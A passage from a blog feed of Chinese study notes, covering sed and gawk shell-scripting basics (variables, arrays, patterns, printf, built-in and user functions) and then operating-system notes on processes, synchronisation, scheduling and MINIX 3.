对可能含有空白行的文件加倍行间距</h3><p>先删除所有的空白行, 然后用 <code>G</code> 命令在所有行后插入新的空白行.</p><h3 id="21-7-3-给文件中的行编号"><a href="#21-7-3-给文件中的行编号" class="headerlink" title="21.7.3 给文件中的行编号"></a>21.7.3 给文件中的行编号</h3><p>在获得等号的输出后, 可以通过管道将输出传给另一个 sed 编辑器脚本, 它会使用 <code>N</code> 命令来合并这两行, 还需要用替换命令将换行符更换成空格或制表符.</p><h3 id="21-7-4-打印末尾行"><a href="#21-7-4-打印末尾行" class="headerlink" title="21.7.4 打印末尾行"></a>21.7.4 打印末尾行</h3><p>创建滚动窗口. 通过循环使用 <code>N</code> 和 <code>D</code> 命令, 可以做到, 向模式空间的文本行块增加新行的同时删除旧行.</p><p><code>q</code> (quit) 退出命令会停止循环.</p><h3 id="21-7-5-删除行"><a href="#21-7-5-删除行" class="headerlink" title="21.7.5 删除行"></a>21.7.5 删除行</h3><p>选择性的删除数据中不需要的空白行.</p><p>区间地址, 如 <code>/./,/^$/</code> 两个 pattern 用 <code>,</code> 分隔, 区间的开始是 <code>/./</code> 匹配任意的一个字符, 结尾是 <code>/^$/</code> 匹配一个空行.</p><h1 id="第22章-gawk-进阶"><a href="#第22章-gawk-进阶" class="headerlink" title="第22章 gawk 进阶"></a>第22章 gawk 进阶</h1><p>gawk 同样不会直接修改文件.</p><h2 id="22-1-使用变量"><a href="#22-1-使用变量" class="headerlink" title="22.1 使用变量"></a>22.1 使用变量</h2><p>两种类型:</p><ul><li>内建变量</li><li>自定义变量</li></ul><h3 id="22-1-1-内建变量"><a href="#22-1-1-内建变量" class="headerlink" title="22.1.1 内建变量"></a>22.1.1 内建变量</h3><h4 id="字段和分割符变量"><a href="#字段和分割符变量" class="headerlink" title="字段和分割符变量"></a>字段和分割符变量</h4><p>数据字段变量. 使用 <code>$</code> 来引用, 如 <code>$1</code>.</p><p>默认情况下, 字段分割符是一个空白字符.</p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td>FIELDWIDTHS</td><td>由空格分隔的一列数字, 定义了每个数据字段确切宽度</td></tr><tr><td>FS</td><td>输入字段分隔符, 默认为空格</td></tr><tr><td>RS</td><td>输入记录分隔符, 默认为换行符</td></tr><tr><td>OFS</td><td>输出字段分隔符号, 默认为空格</td></tr><tr><td>ORS</td><td>输出记录分隔符号, 默认为换行符</td></tr></tbody></table><p><code>F</code> 指 Field, 字段, 一行中的一部分 (不一定).<br><code>R</code> 指 Record, 记录, 指一行 (不一定).</p><p>Field 和 Record 都看你怎么去分割.<br>这里的 <code>O</code> 就是 Output.</p><p>一旦设置了 FIELDWIDTHS, gawk 就会忽略 FS 变量, 并根据提供的字段宽度来计算字段.</p><p>一旦设定了 FIELDWIDTHS 变量的值, 就不能再改变了.</p><p>示例程序:</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">$ gawk <span class="hljs-string">&#x27;BEGIN&#123;FIELDWIDTHS=&quot;3 5 2 5&quot;&#125;&#123;print <span class="hljs-subst">$1</span>,<span class="hljs-subst">$2</span>,<span class="hljs-subst">$3</span>,<span class="hljs-subst">$4</span>&#125;&#x27;</span> datalb<br></code></pre></td></tr></table></figure><h4 id="数据变量"><a href="#数据变量" class="headerlink" title="数据变量"></a>数据变量</h4><p><img src="/../img/gawk_var.png" alt="更多 gawk 内建变量"></p><p>gawk 并不会将程序脚本当成命令参数的一部分.</p><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;BEGIN&#123;print ARGC,ARGV[0],ARGV[1]&#125;&#x27;</span> data1<br>2 gawk data1<br>$<br></code></pre></td></tr></table></figure><p><code>ARGC</code> 变量表明命令行上有两个参数, 这包括 gawk 命令和 data1 参数, 中间的 <code>BEGIN&#123;print ARGC,ARGV[1]&#125;</code> 不算. <code>ARGV</code> 数组从索引 0 开始, 代表的是命令 (即 gawk). 第一个数组值是 gawk 命令后的第一个命令行参数.</p><p>跟 shell 变量不同, 在脚本中引用 gawk 变量时, 变量名前不加美元符.</p><p><code>ENVIRON</code> (environment) 变量使用关联数组 (即字典) 来提取环境变量:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&gt; BEGIN&#123;</span><br><span class="hljs-string">&gt; print ENVIRON[&quot;HOME&quot;]</span><br><span class="hljs-string">&gt; print ENVIRON[&quot;PATH&quot;]</span><br><span class="hljs-string">&gt; &#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>可以用这种方法来提取任何环境变量的值.</p><p><code>NF</code> (Number of Field) 变量可以让你在不知道具体位置的情况下指定记录中的最后一个数据字段:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;BEGIN&#123;FS=&quot;:&quot;; OFS=&quot;:&quot;&#125; &#123;print $1,$NF&#125;&#x27;</span> /etc/passwd<br></code></pre></td></tr></table></figure><p>注意 <code>FNR</code> 和 <code>NR</code> 的区别, <code>FNR</code> 表示当前数据文件中已处理的记录数, <code>NR</code> 变量含有已处理过的记录总数.</p><p>在 shell 脚本中使用 gawk 时, 应该将不同的 gawk 命令放到不同的行, 这样容易理解和阅读.</p><p>可将 gawk 脚本放到一个单独的文件中, 并用 <code>-f</code> 参数来在 shell 脚本中引用.</p><h3 id="22-1-2-自定义变量"><a href="#22-1-2-自定义变量" class="headerlink" title="22.1.2 自定义变量"></a>22.1.2 自定义变量</h3><p>变量名可以是任意数目的字母, 数字和下划线, 但不能以数字开头. 区分大小写.</p><h4 id="1-在脚本中给变量赋值"><a href="#1-在脚本中给变量赋值" class="headerlink" title="1. 在脚本中给变量赋值"></a>1. 在脚本中给变量赋值</h4><p>赋值语句可以包含数学算式来处理数字值.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;BEGIN&#123;x=4; x= x * 2 + 3; print x&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>求余符号为 <code>%</code>, 幂运算为 <code>^</code> 或 <code>**</code></p><h4 id="2-在命令行上给变量赋值"><a href="#2-在命令行上给变量赋值" class="headerlink" title="2. 在命令行上给变量赋值"></a>2. 在命令行上给变量赋值</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">cat</span> script1<br>BEGIN&#123;FS=<span class="hljs-string">&quot;,&quot;</span>&#125;<br>&#123;<span class="hljs-built_in">print</span> <span class="hljs-variable">$n</span>&#125;<br>$ gawk -f script1 n=2 data1<br>data12<br>data22<br>data32<br></code></pre></td></tr></table></figure><p>此方法的缺点, 设置的变量值在代码的 <code>BEGIN</code> 部分不可用.</p><p>使用 <code>-v</code> 命令行参数解决. 其允许在 <code>BEGIN</code> 代码之前设置变量, 在命令行上, <code>-v</code> 命令行参数必须放在脚本代码之前:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk -v n=3 -f script2 data1<br></code></pre></td></tr></table></figure><h2 id="22-2-处理数组"><a href="#22-2-处理数组" class="headerlink" title="22.2 处理数组"></a>22.2 处理数组</h2><p>gawk 使用关联数组 (字典) 提供数组功能.</p><h3 id="22-2-1-定义数组变量"><a href="#22-2-1-定义数组变量" class="headerlink" title="22.2.1 定义数组变量"></a>22.2.1 定义数组变量</h3><p>格式:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">var[index] = element<br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">capital[<span class="hljs-string">&quot;Illinois&quot;</span>] = <span class="hljs-string">&quot;Springfield&quot;</span><br>capital[<span class="hljs-string">&quot;Indiana&quot;</span>] = <span class="hljs-string">&quot;Indianapilis&quot;</span><br></code></pre></td></tr></table></figure><h3 id="22-2-2-遍历数组变量"><a href="#22-2-2-遍历数组变量" class="headerlink" title="22.2.2 遍历数组变量"></a>22.2.2 遍历数组变量</h3><p>关联数组变量的问题在于你可能无法知晓索引值:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-keyword">for</span> (var <span class="hljs-keyword">in</span> array)<br>&#123;<br>    statements<br>&#125;<br></code></pre></td></tr></table></figure><p>这个 <code>for</code> 语句会在每次循环时将关联数组 <code>array</code> 的下一个索引值赋给变量 <code>var</code>, 然后执行一遍 <code>statements</code>.</p><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;BEGIN&#123;</span><br><span class="hljs-string">&gt; var[&quot;a&quot;] = 1</span><br><span class="hljs-string">&gt; var[&quot;g&quot;] = 2</span><br><span class="hljs-string">&gt; var[&quot;m&quot;] = 3</span><br><span class="hljs-string">&gt; var[&quot;u&quot;] = 4</span><br><span class="hljs-string">&gt; for (test in var)</span><br><span class="hljs-string">&gt; &#123;</span><br><span class="hljs-string">&gt;   print &quot;Index:&quot;,test,&quot; -Value:&quot;,var[test]</span><br><span class="hljs-string">&gt; &#125;</span><br><span class="hljs-string">&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>顺序是随机的.</p><h3 id="22-2-3-删除数组变量"><a href="#22-2-3-删除数组变量" class="headerlink" title="22.2.3 删除数组变量"></a>22.2.3 删除数组变量</h3><p>需要用:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">array</span>[<span class="hljs-keyword">index</span>]<br></code></pre></td></tr></table></figure><p>会删除索引和相关的数据元素值.</p><h2 id="22-3-使用模式"><a href="#22-3-使用模式" class="headerlink" title="22.3 使用模式"></a>22.3 使用模式</h2><h3 id="22-3-1-正则表达式"><a href="#22-3-1-正则表达式" class="headerlink" title="22.3.1 正则表达式"></a>22.3.1 正则表达式</h3><p>在使用正则表达式时, 正则表达式必须出现在它要控制的程序脚本的左花括号前.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;BEGIN&#123;FS=&quot;,&quot;&#125; /11/&#123;print $1&#125;&#x27;</span> data1<br>data11<br></code></pre></td></tr></table></figure><p>gawk 程序会用正则表达式对记录中所有的数据字段进行匹配, 包括字段分隔符.</p><h3 id="22-3-2-匹配操作符"><a href="#22-3-2-匹配操作符" class="headerlink" title="22.3.2 匹配操作符"></a>22.3.2 匹配操作符</h3><p>matching operator 允许将正则表达式限定在记录中的特定数据字段. 匹配操作符是 <code>~</code>.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-variable">$1</span> ~ /^data/<br></code></pre></td></tr></table></figure><p>示例:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk -F: <span class="hljs-string">&#x27;$1 ~ /rich/&#123;print $1,$NF&#125;&#x27;</span> /etc/passwd<br></code></pre></td></tr></table></figure><p>先在 <code>$1</code> (即第一个数据字段中) 查找文本 rich, 如果找到了这个模式, 它会打印该记录的第一个 ($1) 和最后一个数据字段 ($NF).</p><p>用 <code>!</code> 符号排除正则表达式的匹配:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$1</span> !~ <span class="hljs-regexp">/expression/</span><br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk -F: <span class="hljs-string">&#x27;$1 !~ /rich/&#123;print $1,$NF&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="22-3-3-数学表达式"><a href="#22-3-3-数学表达式" class="headerlink" title="22.3.3 数学表达式"></a>22.3.3 数学表达式</h3><p>显示所有属于 root 用户组 (组 ID 为 0) 的系统用户:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk -F: <span class="hljs-string">&#x27;$4 == 0&#123;print $1&#125;&#x27;</span> /etc/passwd<br></code></pre></td></tr></table></figure><p><code>$4</code> 为记录的第四个字段.</p><p>可以使用任何常见的数学比较表达式, 如:</p><ul><li><code>x == y</code></li><li><code>x &lt;= y</code></li><li><code>x &lt; y</code></li><li><code>x &gt;= y</code></li><li><code>x &gt; y</code></li></ul><p>也可以对数据文本使用表达式, 但是必须完全匹配:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk -F, <span class="hljs-string">&#x27;$1 == &quot;data&quot;&#123;print $1&#125;&#x27;</span> data1<br></code></pre></td></tr></table></figure><h2 id="22-4-结构化命令"><a href="#22-4-结构化命令" class="headerlink" title="22.4 结构化命令"></a>22.4 结构化命令</h2><h3 id="22-4-1-if-语句"><a href="#22-4-1-if-语句" class="headerlink" title="22.4.1 if 语句"></a>22.4.1 if 语句</h3><p>格式:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> <span class="hljs-comment">(condition)</span><br>    stateme<span class="hljs-symbol">nt1</span><br></code></pre></td></tr></table></figure><p>如果要在 <code>if</code> 语句中执行多条语句, 就必须用花括号将它们括起来:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">&gt; if ($1 &gt; 20)</span><br><span class="hljs-string">&gt; &#123;</span><br><span class="hljs-string">&gt;   x = $1 * 2</span><br><span class="hljs-string">&gt;   print x</span><br><span class="hljs-string">&gt; &#125;</span><br><span class="hljs-string">&gt; &#125;&#x27;</span> data4<br></code></pre></td></tr></table></figure><p>gawk 的 <code>if</code> 语句也支持 <code>else</code> 子句.</p><p>可以在单行上使用 <code>else</code> 子句, 但必须在 <code>if</code> 语句部分之后使用分号:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> <span class="hljs-comment">(condition)</span> stateme<span class="hljs-symbol">nt1</span>; else stateme<span class="hljs-symbol">nt2</span><br></code></pre></td></tr></table></figure><h3 id="22-4-2-while-语句"><a href="#22-4-2-while-语句" class="headerlink" title="22.4.2 while 语句"></a>22.4.2 while 语句</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">while</span> (condition)<br>&#123;<br>    <span class="hljs-built_in">statements</span><br>&#125;<br></code></pre></td></tr></table></figure><p>gawk 编程语言支持在 <code>while</code> 循环中使用 <code>break</code> 语句和 <code>continue</code> 语句.</p><h3 id="22-4-3-do-while-语句"><a href="#22-4-3-do-while-语句" class="headerlink" title="22.4.3 do-while 语句"></a>22.4.3 do-while 语句</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">do</span><br>&#123;<br>    <span class="hljs-built_in">statements</span><br>&#125; <span class="hljs-keyword">while</span> (condition)<br></code></pre></td></tr></table></figure><p>这种格式保证了语句会在条件被求值之前至少执行一次.</p><h3 id="22-4-4-for-语句"><a href="#22-4-4-for-语句" class="headerlink" title="22.4.4 for 语句"></a>22.4.4 for 语句</h3><p>gawk 编程语言支持 C 风格的 for 循环:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">for (variable assignment<span class="hljs-comment">; condition; iteration proces)</span><br></code></pre></td></tr></table></figure><p>也有 <code>i++</code>, <code>total += $1</code>.</p><h2 id="22-5-格式化打印"><a href="#22-5-格式化打印" class="headerlink" title="22.5 格式化打印"></a>22.5 格式化打印</h2><p><code>printf</code> 命令, 和 C 中用发一致:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;format string&quot;</span>, <span class="hljs-built_in">var1</span>, var2 ...<br></code></pre></td></tr></table></figure><p>格式化指定符格式:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">%[modifier]<span class="hljs-keyword">control</span>-letter<br></code></pre></td></tr></table></figure><p>如:<br><img src="/../img/formatstring.png" alt="format string"></p><p>三种修饰符进一步控制输出:</p><ul><li>width: 指定输出字段的最小宽度</li><li>prec: 指定浮点数中小数点后面位数, 或者文本字符串中显示的最大字符数</li><li><code>-</code> (减号): 指明采用左对齐</li></ul><p>使用起来仍然是 <code>%16.1f</code> 这种.</p><h2 id="22-6-内建函数"><a href="#22-6-内建函数" class="headerlink" title="22.6 内建函数"></a>22.6 内建函数</h2><h3 id="22-6-1-数学函数"><a href="#22-6-1-数学函数" class="headerlink" title="22.6.1 数学函数"></a>22.6.1 数学函数</h3><p><img src="/../img/mathfn.png" alt="mathfn"></p><p><code>int()</code> 会生成一个值的整数部分, 其为该值与 0 之间最接近该值的整数.</p><p>产生 0~10 之间的随机整数值:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">x</span> = <span class="hljs-function"><span class="hljs-title">int</span>(<span class="hljs-number">10</span> * <span class="hljs-title">rand</span>())</span><br></code></pre></td></tr></table></figure><p>除了标准数学函数外, gawk 还支持一些按位操作数据的函数:<br><img src="/../img/bitopr.png" alt="bitopr"></p><h3 id="22-6-2-字符串函数"><a href="#22-6-2-字符串函数" class="headerlink" title="22.6.2 字符串函数"></a>22.6.2 字符串函数</h3><p><img src="/../img/strfn1.png" alt="strfn"></p><p><img src="/../img/strfn2.png" alt="strfn"></p><h3 id="22-6-3-时间函数"><a href="#22-6-3-时间函数" class="headerlink" title="22.6.3 时间函数"></a>22.6.3 时间函数</h3><p><img src="/../img/timefn.png" alt="timefn"></p><h2 id="22-7-自定义函数"><a href="#22-7-自定义函数" class="headerlink" title="22.7 自定义函数"></a>22.7 自定义函数</h2><h3 id="22-7-1-定义函数"><a href="#22-7-1-定义函数" class="headerlink" title="22.7.1 定义函数"></a>22.7.1 定义函数</h3><p>使用 function 关键词:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gawk">function name([variables])<br>&#123;<br>    statements<br>&#125;<br></code></pre></td></tr></table></figure><p>函数还能用 <code>return</code> 语句返回值:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">return</span> value<br></code></pre></td></tr></table></figure><h3 id="22-7-2-使用自定义函数"><a href="#22-7-2-使用自定义函数" class="headerlink" title="22.7.2 使用自定义函数"></a>22.7.2 使用自定义函数</h3><p>在定义函数时, 它必须出现在所有代码块之前 (包括 BEGIN 代码块):</p><h3 id="22-7-3-创建函数库"><a href="#22-7-3-创建函数库" class="headerlink" title="22.7.3 创建函数库"></a>22.7.3 创建函数库</h3><p>创建一个含有 gawk 程序的文件, 然后在命令行上用 <code>-f</code> 参数指定库文件和程序文件.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk -f funclib -f script data<br></code></pre></td></tr></table></figure><h2 id="22-8-实例"><a href="#22-8-实例" class="headerlink" title="22.8 实例"></a>22.8 实例</h2><h1 id="第23章-使用其他-shell"><a href="#第23章-使用其他-shell" class="headerlink" title="第23章 使用其他 shell"></a>第23章 使用其他 shell</h1><h2 id="23-4-zsh-shell"><a href="#23-4-zsh-shell" class="headerlink" title="23.4 zsh shell"></a>23.4 zsh shell</h2><p>zsh 提供了一组核心内建命令, 并提供了添加额外命令模块 (command module) 的能力, 每个命令模块都为特定场景提供了另外一组内建命令.</p><h2 id="23-5-zsh-shell-的组成"><a href="#23-5-zsh-shell-的组成" class="headerlink" title="23.5 zsh shell 的组成"></a>23.5 zsh shell 的组成</h2><h1 id="第24章-编写简单的脚本实用工具"><a href="#第24章-编写简单的脚本实用工具" class="headerlink" title="第24章 编写简单的脚本实用工具"></a>第24章 编写简单的脚本实用工具</h1>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Operating Systems Design and Implementation Note</title>
    <link href="/2022/07/15/Operating-Systems-Design-and-Implementation-Note/"/>
    <url>/2022/07/15/Operating-Systems-Design-and-Implementation-Note/</url>
    
    <content type="html"><![CDATA[<h1 id="第二章-进程"><a href="#第二章-进程" class="headerlink" title="第二章 进程"></a>第二章 进程</h1><h2 id="2-1-进程介绍"><a href="#2-1-进程介绍" class="headerlink" title="2.1 进程介绍"></a>2.1 进程介绍</h2><h3 id="2-1-5-进程的状态"><a href="#2-1-5-进程的状态" class="headerlink" title="2.1.5 进程的状态"></a>2.1.5 进程的状态</h3><p>调度器，决定哪个进程应当运行，以及它运行多长时间.</p><p>一些动作，诸如保存寄存器值和设置栈指针等无法用C语言描述，所以用一个短小的汇编语言例程来完成.</p><h3 id="2-1-7-线程"><a href="#2-1-7-线程" class="headerlink" title="2.1.7 线程"></a>2.1.7 线程</h3><p>它们共享相同的地址空间.</p><p>观察进程的一种方式是把进程视为一组相关资源的集合。</p><p>进程用来集合资源，而线程是CPU中调度的实体.</p><p>进程有进程表，线程有线程表.</p><h3 id="2-2-2-临界区"><a href="#2-2-2-临界区" class="headerlink" title="2.2.2 临界区"></a>2.2.2 临界区</h3><p>避免竞争条件, 防止多个进程同时访问共享数据.</p><p>这里把对共享内存进行访问的程序片段称为 critical region 或 critical section.</p><h4 id="TSL指令"><a href="#TSL指令" class="headerlink" title="TSL指令"></a>TSL指令</h4><p>Test and Lock，它将一个存储器字读到寄存器中，然后在该内存地址上存一个非零值. 该指令结束之前其他处理机构均不允许访问该存储器.</p><p>有忙等待的缺点.</p><p>通过TSL指令来确保同一时刻只有一个CPU在对信号量进行操作.</p><h3 id="2-2-6-Mutex"><a href="#2-2-6-Mutex" class="headerlink" title="2.2.6 Mutex"></a>2.2.6 Mutex</h3><p>互斥, Mutex. </p><p>是一个可以处于两态之一的变量: 解锁和加锁. 常用一个二进制位或整数表示.</p><p>加锁即非零，表示已被占用。</p><p>解锁为0.</p><p><mark>死锁 dead lock</mark><br>两个进程永远的阻塞.</p><h3 id="2-2-7-管程"><a href="#2-2-7-管程" class="headerlink" title="2.2.7 管程"></a>2.2.7 管程</h3><p>monitor, 管程，是由过程、变量及数据结构等组成的集合.</p><p>任意时刻管程中只能有一个活跃进程.</p><h2 id="2-3-Classical-IPC-Problems"><a href="#2-3-Classical-IPC-Problems" class="headerlink" title="2.3 Classical IPC Problems"></a>2.3 Classical IPC Problems</h2><h3 id="2-3-1-哲学家进餐问题"><a href="#2-3-1-哲学家进餐问题" class="headerlink" title="2.3.1 哲学家进餐问题"></a>2.3.1 哲学家进餐问题</h3><p>所有的程序都在运行，但却无法取得进展称 starvation 饥饿.</p><p>需保证既不会发生死锁又不会发生饥饿.</p><p>信号量的使用.</p><p>critical region 的运用.</p><h3 id="2-3-2-读者-写者问题"><a href="#2-3-2-读者-写者问题" class="headerlink" title="2.3.2 读者-写者问题"></a>2.3.2 读者-写者问题</h3><h2 id="2-4-Scheduling"><a href="#2-4-Scheduling" class="headerlink" title="2.4 Scheduling"></a>2.4 Scheduling</h2><p>Scheduler，调度器，在操作系统中决定先运行哪一个进程.</p><p>admission scheculer, 准入调度器，决定哪些作业允许进入系统.</p><p>三级调度: 准入调度器， CPU调度器， 内存调度器.</p><h3 id="2-4-3-交互式系统中的调度"><a href="#2-4-3-交互式系统中的调度" class="headerlink" title="2.4.3 交互式系统中的调度"></a>2.4.3 交互式系统中的调度</h3><h4 id="时间片论转调度-Round-Robin-Scheduling"><a href="#时间片论转调度-Round-Robin-Scheduling" class="headerlink" title="时间片论转调度 Round-Robin Scheduling"></a>时间片论转调度 Round-Robin Scheduling</h4><p>每个进程被分配一个时间片.</p><h4 id="优先级调度-Priority-Scheduling"><a href="#优先级调度-Priority-Scheduling" class="headerlink" title="优先级调度 Priority Scheduling"></a>优先级调度 Priority Scheduling</h4><p>每个进程被赋予一个优先级，率先运行优先级最高的就绪进程.</p><p>优先级可以为静态或动态.</p><h3 id="2-4-4-实时系统调度-Scheduling-in-Real-Time-Systems"><a href="#2-4-4-实时系统调度-Scheduling-in-Real-Time-Systems" class="headerlink" title="2.4.4 实时系统调度 Scheduling in Real-Time Systems"></a>2.4.4 实时系统调度 Scheduling in Real-Time Systems</h3><p>通常分为: 硬实时和软实时.</p><h2 id="2-5-MINIX-3-进程概述"><a href="#2-5-MINIX-3-进程概述" class="headerlink" title="2.5 MINIX 3 进程概述"></a>2.5 MINIX 3 进程概述</h2><p>汇编语言负责内核直接与硬件交互的最底层部分，这部分不能用C实现.</p><p>进程都潜在具有一定的特权，这是第二层、第三层和第四层内的进程真正的不同之处.</p><p>理解 kernel call 和 POSIX system call 的区别非常重要.</p><p>内核调用是由系统服务提供的以使驱动程序和服务器完成工作的底层函数.</p><p>POSIX系统调用是由POSIX规范定义的高层调用.</p><p>在init进程运行之前，就有一些系统进程已经运行了.</p><p>在类UNIX系统中，init被赋予的PID为1.</p><p>rc脚本的一个重要功能是检查可能由上次系统崩溃所引起的文件系统错误.</p><p>一个进程的所有信息都保存在进程表中，进程表划分成为内核、内存管理器和文件系统三部分, 分别拥有它们各自所需要的那些域.</p><h3 id="2-5-3-MINIX-3-中的进程间通信"><a href="#2-5-3-MINIX-3-中的进程间通信" class="headerlink" title="2.5.3 MINIX 3 中的进程间通信"></a>2.5.3 MINIX 3 中的进程间通信</h3><p>阻塞：正在执行的进程由于发生某事而暂时无法继续执行.</p><h3 id="2-5-4-MINIX-3-中的进程调度"><a href="#2-5-4-MINIX-3-中的进程调度" class="headerlink" title="2.5.4 MINIX 3 中的进程调度"></a>2.5.4 MINIX 3 中的进程调度</h3><p>中断系统能使多道程序操作系统持续不断地工作,</p><p>任务通常有最高的优先级，驱动程序次之，服务器再次，最后是用户进程。</p><p>只有当所有的系统进程都无事可做时，用户进程才能运行。系统进程不会被用户进程阻止运行.</p><h2 id="2-6-MINIX-3-中进程的实现"><a href="#2-6-MINIX-3-中进程的实现" class="headerlink" title="2.6 MINIX 3 中进程的实现"></a>2.6 MINIX 3 中进程的实现</h2><p>“过程”、“函数”、以及“例程”可以混用。</p><p>每一个C编译器都会到一个默认的头文件目录中去查找include文件，大多数情况下，这个目录是<code>/usr/include/</code>.</p><p>当一个<code>include</code>文件是在一个小于号和一个大于号之间<code>&lt;&gt;</code>被引用时，编译器则到默认头文件目录或者一个指定目录中去查找该文件.</p><p><code>&quot;&quot;</code>中是本地头文件.</p><p><code>src</code>目录应该是<code>source</code>源代码目录.</p><p>通常情况下，操作系统中的三大块通用的程序只有<code>/src/lib/</code>目录中的库程序.</p><p>特性测试宏，feature test macro, 如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _ANSI</span><br></code></pre></td></tr></table></figure><p>在编译一个C程序时，数据结构、参数以及函数返回值在引用它们的代码之前必须是已知的。因此C允许在定义之前使用函数原型来声明一个函数的参数和返回值.</p><p>在一次编译中，一个头文件应该仅被包含一次, 使用:&#96;&#96;&#96;<br>  #ifndef …<br>  …<br>  #endif</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 